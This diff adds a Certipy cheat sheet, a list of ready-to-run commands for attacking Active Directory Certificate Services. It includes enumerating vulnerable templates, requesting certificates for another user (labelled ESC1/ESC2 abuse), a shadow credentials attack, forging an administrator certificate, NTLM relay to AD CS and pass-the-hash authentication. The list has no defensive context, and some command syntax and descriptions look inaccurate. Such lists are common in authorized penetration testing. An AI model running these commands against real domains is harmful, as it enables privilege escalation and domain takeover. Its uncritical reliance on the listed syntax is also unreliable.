@@ -1,0 +1,55 @@
+[X] Certipy Command List
+
+[\] certipy find -u user@domain -p password -dc-ip 192.168.1.10
+[/] Enumerate AD CS configuration and vulnerable templates
+
+[\] certipy find -u user@domain -p password -dc-ip 192.168.1.10 -vulnerable
+[/] Show only vulnerable certificate templates
+
+[\] certipy req -u user@domain -p password -dc-ip 192.168.1.10 -template TemplateName
+[/] Request certificate from template
+
+[\] certipy req -u user@domain -p password -dc-ip 192.168.1.10 -template TemplateName -alt user@domain
+[/] Request certificate for alternate user (ESC1/ESC2 abuse)
+
+[\] certipy auth -pfx cert.pfx
+[/] Authenticate using PFX certificate
+
+[\] certipy ca -u user@domain -p password -dc-ip 192.168.1.10
+[/] Enumerate Certificate Authorities
+
+[\] certipy template -u user@domain -p password -dc-ip 192.168.1.10
+[/] Enumerate certificate templates
+
+[\] certipy account -u user@domain -p password -dc-ip 192.168.1.10
+[/] Query account information via certificates
+
+[\] certipy shadow -u user@domain -p password -dc-ip 192.168.1.10 -account target
+[/] Perform shadow credentials attack
+
+[\] certipy forge -ca ca.pfx -upn administrator@domain
+[/] Forge certificate for target user
+
+[\] certipy relay -target ldap://192.168.1.10
+[/] Perform NTLM relay to AD CS
+
+[\] certipy relay -target ldap://192.168.1.10 -template TemplateName
+[/] Relay and request certificate from template
+
+[\] certipy parse cert.pfx
+[/] Parse and inspect certificate file
+
+[\] certipy cert -pfx cert.pfx
+[/] Display certificate details
+
+[\] certipy find -u user@domain -hashes LMHASH:NTHASH -dc-ip 192.168.1.10
+[/] Authenticate using NTLM hashes
+
+[\] certipy req -u user@domain -p password -dc-ip 192.168.1.10 -template TemplateName -out cert.pfx
+[/] Save requested certificate to file
+
+[\] certipy -h
+[/] Show help menu
+
+[\] certipy --version
+[/] Show version
